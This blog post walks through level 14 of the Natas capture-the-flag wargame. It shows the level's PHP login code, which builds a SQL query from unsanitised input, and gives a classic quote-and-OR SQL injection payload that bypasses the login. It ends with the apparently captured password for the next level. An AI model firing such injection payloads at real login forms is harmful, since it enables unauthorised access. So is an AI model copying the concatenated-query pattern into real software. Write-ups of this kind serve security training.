---
layout: post
title: "Natas Level14 - Level15"
date: 2015-10-02 21:06:37
image: '/assets/img/'
description:
tags: Natas CTF
categories: Natas
twitter_text:
---
This looks intresting! I assume that when you login, that the password for the next challenge will be there:

![Natas 14 home page](/assets/img/screenshots/Natas_Level14-1.png)

Lets look at the source:

    <html>
    <head>
    <!-- This stuff in the header has nothing to do with the level -->
    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
    <script>var wechallinfo = { "level": "natas14", "pass": "<censored>" };</script></head>
    <body>
    <h1>natas14</h1>
    <div id="content">
    <?
    if(array_key_exists("username", $_REQUEST)) {
        $link = mysql_connect('localhost', 'natas14', '<censored>');
        mysql_select_db('natas14', $link);

        $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
        if(array_key_exists("debug", $_GET)) {
            echo "Executing query: $query<br>";
        }

        if(mysql_num_rows(mysql_query($query, $link)) > 0) {
                echo "Successful login! The password for natas15 is <censored><br>";
        } else {
                echo "Access denied!<br>";
        }
        mysql_close($link);
    } else {
    ?>

    <form action="index.php" method="POST">
    Username: <input name="username"><br>
    Password: <input name="password"><br>
    <input type="submit" value="Login" />
    </form>
    <? } ?>
    <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
    </div>
    </body>
    </html>

It looks like a connection is made to the mysql database and the username and password are queryed against the users table. This looks like a standard SQL injection.
Lets take a look at the query:

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";

If we take out all the php code from the query it look like:

    SELECT * from users where username="<<<username>>>>" and password="<<<password>>>"

As you can see from the rest of the source, it looks like the input is not sanitized. So we should be able to inject some code:

    username: name" OR "1"="1
    password: pass" OR "1"="1

AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
